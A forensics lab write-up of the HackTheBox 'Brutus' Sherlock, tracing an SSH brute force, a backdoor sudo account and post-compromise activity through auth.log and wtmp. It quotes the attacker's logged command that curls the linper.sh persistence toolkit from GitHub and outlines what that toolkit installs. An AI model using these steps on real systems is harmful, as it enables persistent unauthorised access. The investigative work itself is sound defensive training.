# Investigation Notes — HTB Brutus Sherlock

**Analyst:** Noel Biju John
**Date:** March 2026
**Artifacts:** `auth.log`, `wtmp`
**Platform:** HackTheBox Sherlock

---

## Artifact Overview

### auth.log
Plain-text Unix authentication log. Records every authentication-related event on the system including:
- SSH login attempts (failed and successful)
- PAM session open/close events
- sudo command execution (`COMMAND` entries)
- User management operations (`useradd`, `usermod`)
- Session IDs assigned to each login session

### wtmp
Binary log recording interactive login sessions. Cannot be read with standard text utilities — requires `utmp.py` or `last` command to parse. Records:
- Username
- Terminal/PTY assigned
- Source IP
- Session start timestamp (in local system time — requires UTC conversion)

Key difference from auth.log: **auth.log records password acceptance; wtmp records terminal session establishment.** The 1-second gap between the two is expected system behaviour, not an anomaly.

---

## Step-by-Step Analysis

### Step 1 — Establish Scope of Brute Force

First pass: identify all unique IPs in auth.log and their frequency.

```bash
grep sshd auth.log | grep -v pam_unix | grep -oP '\d{1,3}(\.\d{1,3}){3}' | sort | uniq -c | sort -rn
```

Output showed three IPs:
- `65.2.161.68` — **165 occurrences**
- Two low-frequency internal/other addresses

165 failures from a single external IP = automated credential stuffing or brute force. Pattern consistent with Hydra / Medusa running a wordlist against SSH root.

---

### Step 2 — Confirm Successful Authentication

Filtered for successful auth events from the attacker IP:

```bash
grep sshd auth.log | grep "Accepted password" | grep 65.2.161.68
```

Result: `Accepted password for root from 65.2.161.68` — root credentials obtained.

**Note on session timing:** The first successful session (Session 34) opened and closed within the same second. This is the automated tool confirming the credential works, not a human logging in. The tool succeeds → closes immediately → attacker notes the valid credentials for manual use.

---

### Step 3 — Parse wtmp for Manual Session

Session 34 confirmed automated. To find the manual session, parsed wtmp:

```bash
python3 utmp.py wtmp
```

Output showed root session from `65.2.161.68` established at `2024-03-06 06:32:45 UTC`.

Cross-reference with auth.log: password accepted at `06:32:44` — 1 second earlier. This 1-second gap = password verification → terminal spawn sequence. Both events refer to the same login.

---

### Step 4 — Identify Manual Session ID

Filtered for all session-opened events from attacker IP:

```bash
grep "session opened" auth.log | grep 65.2.161.68
```

Two sessions: **34** (automated) and **37** (manual). Session 37 remained open — confirmed as the interactive working session.

---

### Step 5 — Trace Post-Compromise Activity in Session 37

Within Session 37, filtered for user management events:

```bash
grep "useradd\|usermod" auth.log
```

Findings:
1. `useradd` — new account `cyberjunkie` created
2. `usermod -aG sudo cyberjunkie` — account added to sudo group

**Why this matters:** Adding to sudo group grants full administrative privileges via `sudo su` or `sudo <command>`. Even if root SSH login is later disabled or root password changed, the attacker retains full control via cyberjunkie.

---

### Step 6 — MITRE Mapping for Persistence

Local account creation for persistent access = **T1136.001 — Create Account: Local Account**

This is under the **Persistence** tactic (TA0003). The sudo group addition escalates this to also touching **Privilege Escalation** via **T1548.003 — Abuse Elevation Control Mechanism: Sudo**.

---

### Step 7 — Session 37 End Time

```bash
grep "session closed for user root" auth.log
```

Session 37 closed at `06:37:24 UTC`. Duration: ~4 minutes 39 seconds. In that window the attacker created the backdoor account and exited.

---

### Step 8 — Persistence Script Download

After Session 37 ended, attacker re-authenticated as `cyberjunkie`. Filtered for sudo COMMAND entries:

```bash
grep "sudo.*COMMAND" auth.log | grep cyberjunkie
```

Full command:
```
sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**linper.sh** = Linux Persistence toolkit (montysecurity on GitHub). Installs multiple persistence mechanisms including cron jobs, SSH key injection, SUID binaries, and shell profile modifications. Using curl (a pre-installed system binary) avoids triggering process-based detections — classic living-off-the-land technique.

---

## Analytical Notes

### Why Session Duration Matters
A session that opens and closes within the same second is a near-certain indicator of an automated tool. Human operators take several seconds minimum to begin interaction after login. This single data point allowed confident separation of the automated phase from the manual phase.

### Why wtmp Complements auth.log
auth.log records the SSH daemon's perspective (password accepted). wtmp records the OS's perspective (interactive session established). Using both artifacts fills gaps — wtmp provides precise session establishment times that auth.log does not always record identically.

### Limitations of This Investigation
- No network capture available — cannot confirm exact tool used for brute force
- No process audit logs — cannot see all commands executed during Session 37 beyond what sudo logged
- wtmp timestamps require UTC conversion — local system time offset must be known
- linper.sh execution not confirmed — only the download command is evidenced in the logs
